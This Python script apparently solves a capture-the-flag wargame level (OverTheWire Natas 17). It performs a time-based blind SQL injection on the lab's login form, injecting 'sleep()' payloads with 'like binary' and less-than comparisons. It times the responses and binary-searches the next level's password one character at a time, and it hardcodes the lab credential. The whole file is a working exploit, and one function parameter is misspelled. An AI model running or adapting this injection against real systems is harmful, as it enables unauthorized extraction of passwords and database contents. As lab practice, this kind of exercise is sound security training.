#! /usr/bin/python

from time import time
from math import sqrt
import requests

url = 'http://natas17.natas.labs.overthewire.org'
auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

characters = [chr(x) for x in range(48,58)]+[chr(x) for x in range(65,91)]+[chr(x) for x in range(97,123)]
lt_inj = 'natas18" and password < binary "{}" '
eq_inj = 'natas18" and password like binary "{}" '

def calc_sd():
  sample_size = 20
  samples = []
  total = 0.0

  for i in range(sample_size):
    ct = time()
    res = requests.post(url, auth=auth, data={'username':'lkargknpnbf'})
    while res.status_code >= 500:
      res = requests.post(url, auth=auth, data={'username':'lkargknpnbf'})
      print('Server error, code {}'.format(res.status_code))
    if res.status_code != 200:
      print('ERROR, CODE {}'.format(res.status_code))
      exit()
    samples.append(time() - ct)
    total += samples[i]
  
  mean = total / len(samples)
  var = 0.0
  for s in samples:
    diff = s - mean
    var += diff*diff
  var = var / (len(samples) - 1)
  return (sqrt(var), mean)

#edit for time attack!!!
def hit(password, target):
  ct = time()
  res = requests.post(url,auth=auth,data={'username':eq_inj.format(password)})
  while res.status_code >= 500:
    ct = time()
    res = requests.post(url,auth=auth,data={'username':eq_inj.format(password)})
    print('Server error, code {}'.format(res.status_code))
  if res.status_code == 200:
    return (time() - ct) >= target
  else:
    print('ERROR, CODE {}'.format(res.status_code))
    exit()
#edit for time attack!!!
def lessThan(password, target):
  ct = time()
  res = requests.post(url,auth=auth,data={'username':lt_inj.format(password)})
  while res.status_code >= 500:
    ct = time()
    res = requests.post(url,auth=auth,data={'username':lt_inj.format(password)})
    print('Server error, code {}'.format(res.status_code))
  if res.status_code == 200:
    return (time() - ct) >= target
  else:
    print('ERROR, CODE {}'.format(res.status_code))
    exit()

def binary_search(pasword, target):
  minimum = 0
  maximum = len(characters)
  mid = int((maximum+minimum)/2)
  
  stop = hit(password+characters[mid]+'%', target)
  while stop is not True:
    print(characters[mid], end=' ', flush=True)
    if mid == minimum or mid == maximum or maximum <= minimum:
      break
    if lessThan(password+characters[mid]+'%', target): 
      maximum = mid
    else:
      minimum = mid
    mid = int((maximum+minimum)/2)
    stop = hit(password+characters[mid]+'%', target)
  print()
  return password + characters[mid]

print('Calculating suitable delay')
(sd, mean) = calc_sd()
delta = sd * 4 + mean
delta = int(delta + 1)
print(f'Found delta: {delta} second(s)')

lt_inj += f'and sleep({delta}) -- "'
eq_inj += f'and sleep({delta}) -- "'

password = ''
for i in range(32):
  for j in range(32):
    if j < len(password):
      print(password[j], end='', flush=True)
    else:
      print('.', end='', flush=True)
  print()

  password = binary_search(password, delta)

print(password)

